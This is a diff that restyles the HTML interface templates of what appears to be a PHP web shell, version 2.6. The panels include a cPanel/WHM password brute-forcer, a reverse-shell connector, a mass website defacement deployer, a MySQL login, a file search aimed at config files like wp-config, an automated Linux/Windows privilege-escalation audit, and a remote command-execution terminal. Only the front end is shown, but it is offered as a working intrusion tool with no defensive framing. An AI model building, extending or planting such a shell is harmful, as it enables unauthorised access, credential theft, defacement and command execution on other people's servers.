@@ -1,44 +1,104 @@
-<section class='cracksection'><form action='' method='POST'><table>
-                    <tr><th>User</th><th>Pass</th></tr><tr><td><textarea name='userlist' required></textarea></td>
-                    <td><textarea name='passlist' required></textarea></td></tr>
-                    <tr><td id='crackx'><label>Host : </label><input type='text' name='host' placeholder='target.com' required></td>
-                    <td id='crackx'><label>Timeout : </label><input type='text' name='timeout' placeholder='0.1' required></td></tr>
-                    <tr><td id='toright'><input type='radio' name='portc' value='2083' required><label>Cpanel</label></td>
-                    <td><input type='radio' name='portc' value='2087' required><label>WHM</label></td></tr></table>
-                    <div id='subcrack'><input type='submit' name='crack' value='Crack' required></div>
-                    </form></section>||<form action='' method='POST'><table><tr>
-                    <td id='reva'><label>Address : </label></td><td><input type='text' name='dfsaddr' placeholder='192.168.1.1' /></td></tr>
-                    <tr><td id='reva'><label>Port : </label></td><td><input type='text' name='dfsport' placeholder='1337' /></td></tr>
-                    <tr><td></td><td id='revc'><input type='submit' name='dfsrev' value='Reverse' /></td></tr>
-                    </table></form>||<form action='' method='POST'>
-                    <table>
-                    <tr><td><label>Code : </label></td><td><textarea name='codemass'></textarea></td></tr>
-		    <tr><td><label>Remote : </label></td><td><input type='text' name='fromurl' placeholder='https://url/deface.txt'></td></tr>
-                    <tr><td><label>Filename : </label></td><td><input type='text' name='massname' placeholder='deface.html'></td></tr>
-                    <tr><td><label>Path : </label></td><td><input type='text' name='masspath' placeholder='/var/www/html/path/'></td></tr>
-<tr><td></td><td><input type='submit' name='dfmass' value='Mass'></td></tr>
-                    </table>
-                    </form>||<!-- Nothing -->||<fieldset><center><label>MYSQL CONNECT</label></center><form action='' method='POST'><table>
-                    <tr><td><label>Host : </label></td><td>
-                    <input type='text' placeholder='127.0.0.1' name='sqlhost'/></td></tr>
-                    <tr><td><label>User : </label></td><td>
-                    <input type='text' placeholder='root' name='sqluser'/></td></tr>
-                    <tr><td><label>Pass : </label></td><td>
-                    <input type='text' placeholder='' name='sqlpass'/></td></tr>
-                    <tr><td><label></label></td><td>
-                    <input type='submit' value='Connect' name='connect_sql'/></td></tr></table>
-                    </form></fieldset>||<section class='searchbox'><h3>File Search <small style='color:#888'>(v2.6)</small></h3><form action='' method='POST'><table>
-                    <tr><td><label>Base path : </label></td><td><input type='text' name='searchpath' value='%{BASE}%' style='width:320px'></td></tr>
-                    <tr><td><label>Keyword : </label></td><td><input type='text' name='searchkey' value='%{KEY}%' placeholder='wp-config'></td></tr>
-                    <tr><td><label>Extension : </label></td><td><input type='text' name='searchext' value='%{EXT}%' placeholder='php (optional)'></td></tr>
-                    <tr><td></td><td><input type='submit' name='dfsearch' value='Search'></td></tr></table></form>
-                    <div class='scanresults'>%{RESULTS}%</div></section>||<section class='lpe'><h3>Auto Privilege Escalation Audit <small style='color:#888'>(v2.6 — Cross-Platform)</small></h3>
-                    <p class='lpe-intro'>Automated privilege escalation audit across <b>Linux</b> (SUID/SGID, capabilities, kernel CVEs, writable passwd &amp; system paths, sudo, cron, Docker, NFS, Polkit, container escape) and <b>Windows</b> (token privileges, unquoted services, writable binaries, AlwaysInstallElevated, UAC bypass, autorun keys, scheduled tasks, stored credentials, DLL hijacking, Potato, vulnerable drivers). Spawns subprocesses — allow 10-60 s.</p>
-                    <div class='lpe-output'>%{LPE}%</div></section>||<section class='fileinfo'><h3>PHP Info</h3>
-                    <div class='pi-dark'>%{PI}%</div></section>||<section id='cmd_area'><p class='dfs-cwd'>cwd: %{CWD}% &nbsp;|&nbsp; exec: <b>%{EXEC}%</b></p>
-                    <div id='ajaxterm'><div class='dfs-ajax-hint'>Ajax terminal ready — type a command below. History: up/down arrows.</div></div>
-                    <form id='ajaxform' action='' method='POST' autocomplete='OFF' onsubmit='return dfsAjaxRun()'><input id='ajaxinput' type='text' placeholder='whoami (ajax, no reload)' autofocus></form>
-                    <details class='dfs-classic'><summary>Classic form (page reload fallback)</summary>
-                    <form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>%{OUT}%</textarea><br><input type='text' name='dfscmd' placeholder='whoami' value='%{LASTCMD}%'><br><button>Execute</button></form>
-                    </details>
-                    <p class='dfs-tip'>Tip: new in v2.6 — ajax terminal above runs without reload.</p></section>
+<!-- [0] Crack -->
+<section class="cracksection dfs-card">
+<form action='' method='POST'>
+<table>
+  <tr><th>User List</th><th>Pass List</th></tr>
+  <tr>
+    <td><textarea name='userlist' required placeholder='Paste user list…'></textarea></td>
+    <td><textarea name='passlist' required placeholder='Paste pass list…'></textarea></td>
+  </tr>
+  <tr>
+    <td id='crackx'><label>Host</label><input type='text' name='host' placeholder='target.com' required></td>
+    <td id='crackx'><label>Timeout</label><input type='text' name='timeout' placeholder='0.1' required></td>
+  </tr>
+  <tr>
+    <td id='toright'><input type='radio' name='portc' value='2083' required><label>Cpanel</label></td>
+    <td><input type='radio' name='portc' value='2087' required><label>WHM</label></td>
+  </tr>
+</table>
+<div id='subcrack'><input type='submit' name='crack' value='Crack'></div>
+</form>
+</section>
+||
+<!-- [1] Reverse Shell -->
+<section class="reverse dfs-card">
+<form action='' method='POST'>
+<table>
+  <tr><td id='reva'><label>Address</label></td><td><input type='text' name='dfsaddr' placeholder='192.168.1.1' /></td></tr>
+  <tr><td id='reva'><label>Port</label></td><td><input type='text' name='dfsport' placeholder='1337' /></td></tr>
+  <tr><td></td><td id='revc'><input type='submit' name='dfsrev' value='Connect' /></td></tr>
+</table>
+</form>
+</section>
+||
+<!-- [2] Mass Deface -->
+<section class="mass dfs-card">
+<form action='' method='POST'>
+<table>
+  <tr><td><label>Code</label></td><td><textarea name='codemass' placeholder='<?php … ?>'></textarea></td></tr>
+  <tr><td><label>Remote URL</label></td><td><input type='text' name='fromurl' placeholder='https://url/deface.txt'></td></tr>
+  <tr><td><label>Filename</label></td><td><input type='text' name='massname' placeholder='deface.html'></td></tr>
+  <tr><td><label>Path</label></td><td><input type='text' name='masspath' placeholder='/var/www/html/path/'></td></tr>
+  <tr><td></td><td><input type='submit' name='dfmass' value='Deploy'></td></tr>
+</table>
+</form>
+</section>
+||
+<!-- [3] Nothing -->
+<!-- [4] MySQL Connect -->
+<fieldset class="databases dfs-card">
+<center><label>MYSQL CONNECT</label></center>
+<form action='' method='POST'>
+<table>
+  <tr><td><label>Host</label><input type='text' placeholder='127.0.0.1' name='sqlhost'/></td></tr>
+  <tr><td><label>User</label><input type='text' placeholder='root' name='sqluser'/></td></tr>
+  <tr><td><label>Pass</label><input type='text' placeholder='' name='sqlpass'/></td></tr>
+  <tr><td></td><td><input type='submit' value='Connect' name='connect_sql'/></td></tr>
+</table>
+</form>
+</fieldset>
+||
+<!-- [5] Search -->
+<section class="searchbox dfs-card">
+<h3><i class="fa-solid fa-magnifying-glass" style="margin-right:8px"></i>File Search <small style='color:#666'>(v2.6)</small></h3>
+<form action='' method='POST'>
+<table>
+  <tr><td><label>Base path</label></td><td><input type='text' name='searchpath' value='%{BASE}%' style='width:320px'></td></tr>
+  <tr><td><label>Keyword</label></td><td><input type='text' name='searchkey' value='%{KEY}%' placeholder='wp-config'></td></tr>
+  <tr><td><label>Extension</label></td><td><input type='text' name='searchext' value='%{EXT}%' placeholder='php (optional)'></td></tr>
+  <tr><td></td><td><input type='submit' name='dfsearch' value='Search'></td></tr>
+</table>
+</form>
+<div class='scanresults'>%{RESULTS}%</div>
+</section>
+||
+<!-- [6] LPE Header -->
+<section class='lpe'>
+<h3><i class="fa-solid fa-shield-halved" style="margin-right:8px"></i>Auto Privilege Escalation Audit <small style='color:#666'>(v2.6 — Cross-Platform)</small></h3>
+<p class='lpe-intro'>Automated privilege escalation audit across <b>Linux</b> (SUID/SGID, capabilities, kernel CVEs, writable paths, sudo, cron, Docker, NFS, Polkit, container escape) and <b>Windows</b> (token privileges, unquoted services, writable binaries, AlwaysInstallElevated, UAC bypass, autorun, scheduled tasks, stored credentials, DLL hijacking, Potato, vulnerable drivers). Spawns subprocesses — allow 10–60 s.</p>
+<div class='lpe-output'>%{LPE}%</div>
+</section>
+||
+<!-- [7] PHP Info -->
+<section class="fileinfo dfs-card">
+<h3><i class="fa-solid fa-circle-info" style="margin-right:8px"></i>PHP Info</h3>
+<div class='pi-dark'>%{PI}%</div>
+</section>
+||
+<!-- [8] Ajax Terminal -->
+<section id="cmd_area" class="dfs-card">
+<p class='dfs-cwd'><i class="fa-solid fa-terminal"></i> cwd: %{CWD}% &nbsp;|&nbsp; exec: <b>%{EXEC}%</b></p>
+<div id='ajaxterm'><div class='dfs-ajax-hint'><i class="fa-solid fa-terminal"></i> Ajax terminal ready — type a command below. History: up/down arrows.</div></div>
+<form id='ajaxform' action='' method='POST' autocomplete='OFF' onsubmit='return dfsAjaxRun()'>
+  <input id='ajaxinput' type='text' placeholder='whoami (ajax, no reload)' autofocus>
+</form>
+<details class='dfs-classic'>
+  <summary><i class="fa-solid fa-angle-down"></i> Classic form (page reload fallback)</summary>
+  <form action='' method='POST' autocomplete='OFF'>
+    <textarea class='cmd_response' readonly='TRUE'>%{OUT}%</textarea><br>
+    <input type='text' name='dfscmd' placeholder='whoami' value='%{LASTCMD}%'><br>
+    <button>Execute</button>
+  </form>
+</details>
+<p class='dfs-tip'><i class="fa-solid fa-circle-info"></i> Tip: v2.6 — ajax terminal runs without reload.</p>
+</section>
